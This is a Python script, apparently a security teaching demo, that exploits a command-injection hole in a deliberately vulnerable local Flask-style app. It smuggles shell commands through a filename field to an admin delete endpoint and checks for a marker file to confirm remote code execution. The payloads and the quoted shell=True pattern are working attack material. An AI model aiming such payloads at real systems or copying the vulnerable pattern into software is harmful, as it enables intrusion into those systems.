"""
Command Injection Attack Demo
Uses the admin /admin/messages/delete endpoint which runs:
    subprocess.run(f"rm {MESSAGES_DIR}/{filename}", shell=True)
An attacker with admin session can inject arbitrary shell commands.
Run against the VULNERABLE app (port 5000).
"""
import requests
import time

BASE = "http://127.0.0.1:5000"
SESSION = requests.Session()

# Marker file written by the injected command — proves RCE
MARKER = "/tmp/pwned_by_cmd_injection.txt"


def login_admin():
    SESSION.post(f"{BASE}/login", data={"username": "admin", "password": "admin123"})


def inject(payload: str):
    """Submit filename payload to the admin delete endpoint."""
    r = SESSION.post(
        f"{BASE}/admin/messages/delete",
        data={"filename": payload},
        allow_redirects=True,
    )
    return r


def verify_rce():
    """Check if the marker file was created by the injected command."""
    import os
    return os.path.exists(MARKER)


if __name__ == "__main__":
    print("=" * 60)
    print("Command Injection Demo — Vulnerable App (port 5000)")
    print("=" * 60)
    login_admin()

    # Payload: close the rm command, then run a second command
    # rm <MESSAGES_DIR>/nonexistent; touch /tmp/pwned_by_cmd_injection.txt
    payloads = [
        f"nonexistent; touch {MARKER}",
        f"nonexistent && echo pwned > {MARKER}",
        f"nonexistent | touch {MARKER}",
    ]

    for p in payloads:
        print(f"\n[CmdInjection] payload: {p!r}")
        r = inject(p)
        print(f"  status={r.status_code}")
        time.sleep(0.3)
        if verify_rce():
            print(f"  RCE CONFIRMED: marker file {MARKER} exists!")
            break
    else:
        print("\n  Note: /tmp/ may not exist on Windows.")
        print("  Try payload: nonexistent & echo pwned > C:\\Windows\\Temp\\pwned.txt")
        # Windows-compatible payload
        win_marker = "C:\\Windows\\Temp\\pwned_cmd_injection.txt"
        win_payload = f"nonexistent & echo pwned > {win_marker}"
        print(f"\n[CmdInjection] Windows payload: {win_payload!r}")
        r = inject(win_payload)
        print(f"  status={r.status_code}")
        import os
        if os.path.exists(win_marker):
            print(f"  RCE CONFIRMED: marker file {win_marker} exists!")
        else:
            print("  (marker not found — check if app is running and admin login succeeded)")
